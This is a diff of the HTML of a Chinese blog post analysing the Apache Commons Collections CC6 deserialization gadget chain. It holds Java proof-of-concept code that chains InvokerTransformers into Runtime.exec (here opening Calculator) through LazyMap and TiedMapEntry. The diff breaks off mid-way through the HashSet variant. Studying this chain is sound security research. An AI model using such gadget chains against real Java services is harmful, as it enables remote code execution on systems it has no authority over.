@@ -211,7 +211,7 @@
     <h1 class="post-title">
       CommonsCollections6分析
     </h1>
-    <div class="post-meta"><span title='2022-10-29 15:10:18 +0800 +0800'>2022-10-29</span>&nbsp;·&nbsp;6 分钟&nbsp;·&nbsp;Reus09
+    <div class="post-meta">&lt;span title=&#39;2022-10-29 15:10:18 &#43;0800 &#43;0800&#39;&gt;2022-10-29&lt;/span&gt;&amp;nbsp;·&amp;nbsp;6 分钟&amp;nbsp;·&amp;nbsp;Reus09
 
 </div>
   </header> <aside id="toc-container" class="toc-container wide">
@@ -396,21 +396,21 @@
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> CC6<span style="color:#f92672">;</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> CC6;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> Util.SeralizeUtil<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.Transformer<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ChainedTransformer<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ConstantTransformer<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InvokerTransformer<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.LazyMap<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> Util.SeralizeUtil;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.LazyMap;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.InvocationTargetException<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.InvocationTargetException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">/**
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @ClassName CC6WithHashMap
@@ -419,46 +419,46 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @Date 2022/10/29 15:34
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @Version 1.0
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> **/</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC6WithHashMap</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC6WithHashMap</span> {
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String fileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CC6WithHashMap.bin&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String fileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CC6WithHashMap.bin&#34;</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IOException<span style="color:#f92672">,</span> ClassNotFoundException<span style="color:#f92672">,</span> NoSuchFieldException<span style="color:#f92672">,</span> IllegalAccessException<span style="color:#f92672">,</span> InvocationTargetException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InvocationTargetException {
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 初始化 HashMap
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        HashMap<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">,</span> Object<span style="color:#f92672">&gt;</span> hashMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 初始化 HashMap</span>
+</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>Object, Object<span style="color:#f92672">&gt;</span> hashMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 创建 ChainedTransformer
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]{</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer<span style="color:#f92672">(</span>Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">),</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;getMethod&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>String<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> Class<span style="color:#f92672">[].</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span><span style="color:#e6db74">&#34;getRuntime&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">}),</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;invoke&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>Object<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> Object<span style="color:#f92672">[].</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">}),</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;exec&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>String<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span><span style="color:#e6db74">&#34;open -a Calculator.app&#34;</span><span style="color:#f92672">})</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">};</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 创建 ChainedTransformer</span>
+</span></span><span style="display:flex;"><span>        Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(Runtime.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;getMethod&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>, Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;getRuntime&#34;</span>, <span style="color:#66d9ef">null</span>}),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;invoke&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Object.<span style="color:#a6e22e">class</span>, Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>}),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;exec&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;open -a Calculator.app&#34;</span>})
+</span></span><span style="display:flex;"><span>        };
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 创建一个空的 ChainedTransformer
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        ChainedTransformer fakeChain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]{});</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 创建一个空的 ChainedTransformer</span>
+</span></span><span style="display:flex;"><span>        ChainedTransformer fakeChain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(<span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{});
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 创建 LazyMap 并引入 TiedMapEntry
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        Map lazyMap <span style="color:#f92672">=</span> LazyMap<span style="color:#f92672">.</span><span style="color:#a6e22e">decorate</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">(),</span> fakeChain<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        TiedMapEntry entry   <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry<span style="color:#f92672">(</span>lazyMap<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;reus09&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 创建 LazyMap 并引入 TiedMapEntry</span>
+</span></span><span style="display:flex;"><span>        Map lazyMap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(<span style="color:#66d9ef">new</span> HashMap(), fakeChain);
+</span></span><span style="display:flex;"><span>        TiedMapEntry entry   <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry(lazyMap, <span style="color:#e6db74">&#34;reus09&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        hashMap<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>entry<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;reus&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//用反射再改回真的chain
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        Field f <span style="color:#f92672">=</span> ChainedTransformer<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;iTransformers&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>fakeChain<span style="color:#f92672">,</span> transformers<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//清空由于 hashMap.put 对 LazyMap 造成的影响
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        lazyMap<span style="color:#f92672">.</span><span style="color:#a6e22e">clear</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        hashMap.<span style="color:#a6e22e">put</span>(entry, <span style="color:#e6db74">&#34;reus&#34;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        SeralizeUtil<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObjectToFile</span><span style="color:#f92672">(</span>hashMap<span style="color:#f92672">,</span> fileName<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        SeralizeUtil<span style="color:#f92672">.</span><span style="color:#a6e22e">readFileObject</span><span style="color:#f92672">(</span>fileName<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//用反射再改回真的chain</span>
+</span></span><span style="display:flex;"><span>        Field f <span style="color:#f92672">=</span> ChainedTransformer.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;iTransformers&#34;</span>);
+</span></span><span style="display:flex;"><span>        f.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        f.<span style="color:#a6e22e">set</span>(fakeChain, transformers);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//清空由于 hashMap.put 对 LazyMap 造成的影响</span>
+</span></span><span style="display:flex;"><span>        lazyMap.<span style="color:#a6e22e">clear</span>();
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        SeralizeUtil.<span style="color:#a6e22e">writeObjectToFile</span>(hashMap, fileName);
+</span></span><span style="display:flex;"><span>        SeralizeUtil.<span style="color:#a6e22e">readFileObject</span>(fileName);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>弹窗如下</p>
@@ -531,20 +531,20 @@
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> CC6<span style="color:#f92672">;</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> CC6;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> Util.SeralizeUtil<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.Transformer<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ChainedTransformer<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ConstantTransformer<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InvokerTransformer<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.LazyMap<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> Util.SeralizeUtil;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.LazyMap;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashSet<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashSet;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">/**
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @ClassName CC6WithHashSet
@@ -553,45 +553,45 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @Date 2022/10/29 15:40
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @Version 1.0
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> **/</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC6WithHashSet</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC6WithHashSet</span> {
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String fileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CC6WithHashSet.bin&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String fileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CC6WithHashSet.bin&#34;</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 初始化 HashMap
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        HashMap<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">,</span> Object<span style="color:#f92672">&gt;</span> hashMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 初始化 HashMap</span>
+</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>Object, Object<span style="color:#f92672">&gt;</span> hashMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 创建 ChainedTransformer
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]{</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer<span style="color:#f92672">(</span>Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">),</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;getMethod&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>String<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> Class<span style="color:#f92672">[].</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span><span style="color:#e6db74">&#34;getRuntime&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">}),</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;invoke&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>Object<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> Object<span style="color:#f92672">[].</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">}),</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;exec&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>String<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span><span style="color:#e6db74">&#34;open -a Calculator.app&#34;</span><span style="color:#f92672">})</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">};</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 创建 ChainedTransformer</span>
+</span></span><span style="display:flex;"><span>        Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(Runtime.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;getMethod&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>, Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;getRuntime&#34;</span>, <span style="color:#66d9ef">null</span>}),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;invoke&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Object.<span style="color:#a6e22e">class</span>, Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>}),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;exec&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;open -a Calculator.app&#34;</span>})
+</span></span><span style="display:flex;"><span>        };
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 创建一个空的 ChainedTransformer
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        ChainedTransformer fakeChain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]{});</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 创建一个空的 ChainedTransformer</span>
+</span></span><span style="display:flex;"><span>        ChainedTransformer fakeChain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(<span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{});
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 创建 LazyMap 并引入 TiedMapEntry
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        Map lazyMap <span style="color:#f92672">=</span> LazyMap<span style="color:#f92672">.</span><span style="color:#a6e22e">decorate</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">(),</span> fakeChain<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        TiedMapEntry entry   <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry<span style="color:#f92672">(</span>lazyMap<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;reus09&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 创建 LazyMap 并引入 TiedMapEntry</span>
+</span></span><span style="display:flex;"><span>        Map lazyMap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(<span style="color:#66d9ef">new</span> HashMap(), fakeChain);
+</span></span><span style="display:flex;"><span>        TiedMapEntry entry   <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry(lazyMap, <span style="color:#e6db74">&#34;reus09&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        HashSet set <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashSet<span style="color:#f92672">(</span><span style="color:#ae81ff">1</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        set<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span>entry<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        HashSet set <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashSet(1);
+</span></span><span style="display:flex;"><span>        set.<span style="color:#a6e22e">add</span>(entry);
